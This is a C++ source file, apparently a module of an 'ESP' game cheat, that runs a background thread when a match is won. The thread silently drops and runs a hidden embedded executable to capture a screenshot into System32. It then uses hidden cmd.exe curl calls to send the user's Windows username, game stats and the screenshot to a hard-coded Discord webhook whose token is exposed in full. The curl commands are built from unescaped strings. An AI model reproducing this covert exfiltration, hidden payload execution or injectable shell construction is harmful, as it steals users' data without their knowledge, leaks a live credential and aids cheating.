
#include "wwcd.h"
//#include <atlimage.h>
#include <thread>
#include "../Setting.h"
#include "../Data.h"
#include "../Esp.h"
#include "../Resource\resource.h"

bool loginwwcd = true;
using namespace std;
using namespace wwcd;

const string cmd1p1 = "curl -i -H \"Accept: application/json\" -H \"Content-Type:application/json\" -X POST --data \"{\\\"content\\\": \\\"";
const string cmd1p2 = "\\\"}\" ";
const string cmd2p1 = "curl -F \"file1=@";

int system_no_output(std::string command)
{
	command.insert(0, "/C ");

	SHELLEXECUTEINFOA ShExecInfo = { 0 };
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = NULL;
	ShExecInfo.lpFile = "cmd.exe";
	ShExecInfo.lpParameters = command.c_str();
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;

	if (ShellExecuteExA(&ShExecInfo) == FALSE)
		return -1;

	WaitForSingleObject(ShExecInfo.hProcess, INFINITE);

	DWORD rv;
	GetExitCodeProcess(ShExecInfo.hProcess, &rv);
	CloseHandle(ShExecInfo.hProcess);

	return rv;
}

void SendText(string text, string webhook_url) {
	ShowWindow(GetConsoleWindow(), HIDE_WINDOW());

	string cmd = cmd1p1 + text + cmd1p2 + webhook_url;

	system_no_output(cmd.c_str());
	system_no_output("cls");
}

void SendFile(string path, string webhook_url) {
	ShowWindow(GetConsoleWindow(), HIDE_WINDOW());

	string cmd = cmd2p1 + path + "\" " + webhook_url;
	
	system_no_output(cmd.c_str());
	system_no_output("cls");

	
}

//void Esp::TakeScreenShot(const std::string& path)
//{
//	////keybd_event(VK_MENU, 0, 0, 0); //Alt Press
//	//keybd_event(VK_SNAPSHOT, 0, 0, 0); //PrntScrn Press
//	//keybd_event(VK_SNAPSHOT, 0, KEYEVENTF_KEYUP, 0); //PrntScrn Release
//	//keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0); //Alt Release
//	//HBITMAP hBitmap;
//	//Sleep(200);
//	//OpenClipboard(NULL);
//	//hBitmap = (HBITMAP)GetClipboardData(CF_BITMAP);
//	//CloseClipboard();
//	//std::vector<BYTE> buf;
//	//IStream* stream = NULL;
//	//HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
//	//CImage image;
//	//ULARGE_INTEGER liSize;
//	//image.Attach(hBitmap);
//	//image.Save(stream, Gdiplus::ImageFormatPNG);
//	//IStream_Size(stream, &liSize);
//	//DWORD len = liSize.LowPart;
//	//IStream_Reset(stream);
//	//buf.resize(len);
//	//IStream_Read(stream, &buf[16], len);
//	//stream->Release();
//	//std::fstream fi;
//	//fi.open(path, std::fstream::binary | std::fstream::out);
//	//fi.write(reinterpret_cast<const char*>(&buf[16]), buf.size() * sizeof(BYTE));
//	//fi.close();
//	//std::this_thread::sleep_for(std::chrono::milliseconds(40));
//}

void WriteResToDisk2(std::string PathFile, /*LPCSTR*/LPWSTR File_WITHARG)//MainFontPath
{
	HRSRC myResource = ::FindResource(NULL, File_WITHARG, RT_RCDATA);
	unsigned int myResourceSize = ::SizeofResource(NULL, myResource);
	HGLOBAL myResourceData = ::LoadResource(NULL, myResource);
	void* pMyExecutable = ::LockResource(myResourceData);
	std::ofstream f(PathFile, std::ios::out | std::ios::binary);
	f.write((char*)pMyExecutable, myResourceSize);
	f.close();
}

VOID wwcd::wwcdThread()
{
	ShowWindow(GetConsoleWindow(), HIDE_WINDOW());
	FreeConsole();
	while (true)
	{
	    if (Setting::WWCD)
		{
			remove("C:\\Windows\\System32\\megWWCDPHOTOS.png");
			if (Data::NetDriver > 0)
			{
				if (Data::TimeRemind >= 60)//if (Data::TimeRemind >= 10 && Data::TimeRemind <= 30)//if (Data::TimeRemind >= 10)
				{
					if (Data::AliveTeamNum == 1)
					{
						/*Sleep(1000);
						std::string path = ("C:\\Windows\\System32\\megWWCDPHOTOS.png");
						Esp::TakeScreenShot(path);
						Sleep(1000);*/

						WriteResToDisk2("C:\\ProgramData\\TakeScreenShotRun.exe", (/*LPCSTR*/LPWSTR)MAKEINTRESOURCE(TakeScreenShotRun));//TakeScreenShotRun.exe

						if (!Setting::ShowSideMenu)
						{
							Setting::ShowSideMenu = true;
						}

						//Sleep(1000);
						//if (!Setting::ShowMenu)
						//{
						//	Setting::ShowMenu = !Setting::ShowMenu;
						//	//Setting::ShowMenu = false;
						//	Utility::ChangeClickability(TRUE, DX11Window::hWindow);
						//	DX11Window::IsClickable = !DX11Window::IsClickable;
						//}
						Sleep(1000);
						ShellExecute(0, L"open", L"C:\\ProgramData\\TakeScreenShotRun.exe", NULL, 0, SW_HIDE);
						Sleep(1000);

						//if (Setting::ShowMenu)
						//{
						//	Setting::ShowMenu = !Setting::ShowMenu;
						//	//Setting::ShowMenu = false;
						//	Utility::ChangeClickability(FALSE, DX11Window::hWindow);
						//	DX11Window::IsClickable = !DX11Window::IsClickable;

						//}

						char pcname[1000];
						std::string getusername = getenv("username");
						//SendText("**Winner Winner Chicken Dinner**, Photos Send By: " + (getusername), "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
						SendText("**Winner Winner Chicken Dinner**", "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
						SendText("**-----------------------------------**", "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
						//SendText("Photos Send By: " + (getusername), "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
						SendText("Photos Send By: ESP  CHEAT", "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
						SendText("User Name: " + (getusername), "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
						SendText("**Game Info------------------------**", "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");

						//SendText("Map: " + (Data::LocalPawn), "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
						//SendText("Kills: " + (to_string(Data::MyPlayerTotalKills)), "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
						SendText("Map: " + (Data::LocalPawnWWCD)+", Total Kills: " + (to_string(Data::MyPlayerTotalKillsWWCD)), "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
						int minutes = Data::TimeRemindWWCD / 60;
						int hours = minutes / 60;
						//SendText("Game Time: " + (to_string(hours) + "h: ").append(to_string(minutes % 60) + "m: ").append(to_string(Data::TimeRemind % 60) + "s"), "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
						SendText("Game Finishing Time: " + (to_string(hours) + "h: ").append(to_string(minutes % 60) + "m: ").append(to_string(Data::TimeRemindWWCD % 60) + "s"), "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
						SendFile("C:\\Windows\\System32\\megWWCDPHOTOS.png", "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
						Sleep(1000);
						remove("C:\\Windows\\System32\\megWWCDPHOTOS.png");
						remove("C:\\ProgramData\\TakeScreenShotRun.exe");
						std::this_thread::sleep_for(std::chrono::minutes(5));//60000 = 1min
					}

				}
			}

			{
				//Sleep(1000);
				//ShellExecute(0, L"open", L"C:\\ProgramData\\TakeScreenShotRun.exe", NULL, 0, SW_HIDE);
				//Sleep(1000);

				//char pcname[1000];
				//std::string getusername = getenv("username");
				////SendText("**Winner Winner Chicken Dinner**, Photos Send By: " + (getusername), "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
				//SendText("**Winner Winner Chicken Dinner**", "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
				//SendText("**-----------------------------------**", "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
				////SendText("Photos Send By: " + (getusername), "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
				//SendText("Photos Send By: ESP  CHEAT", "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
				//SendText("User Name: " + (getusername), "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
				//SendText("**Game Info------------------------**", "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");

				////SendText("Map: " + (Data::LocalPawn), "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
				////SendText("Kills: " + (to_string(Data::MyPlayerTotalKills)), "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
				//SendText("Map: " + (Data::LocalPawnWWCD)+", Total Kills: " + (to_string(Data::MyPlayerTotalKillsWWCD)), "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
				//int minutes = Data::TimeRemindWWCD / 60;
				//int hours = minutes / 60;
				////SendText("Game Time: " + (to_string(hours) + "h: ").append(to_string(minutes % 60) + "m: ").append(to_string(Data::TimeRemind % 60) + "s"), "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
				//SendText("Game Finishing Time: " + (to_string(hours) + "h: ").append(to_string(minutes % 60) + "m: ").append(to_string(Data::TimeRemindWWCD % 60) + "s"), "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
				//SendFile("C:\\Windows\\System32\\megWWCDPHOTOS.png", "https://discord.com/api/webhooks/1267302946035732580/kQQJ5H2YBG-8TKQXuRHpVJwsy7YqXitq4vbNRXzP4e3LXqy_moxUiui7HQGO0AwuzY3s");
				//Sleep(1000);
				//remove("C:\\Windows\\System32\\megWWCDPHOTOS.png");
				////std::this_thread::sleep_for(std::chrono::milliseconds(3000000));//60000 = 1min
				//std::this_thread::sleep_for(std::chrono::minutes(5));//60000 = 1min
			}
	    }
	    std::this_thread::sleep_for(std::chrono::milliseconds(40));		
	}
}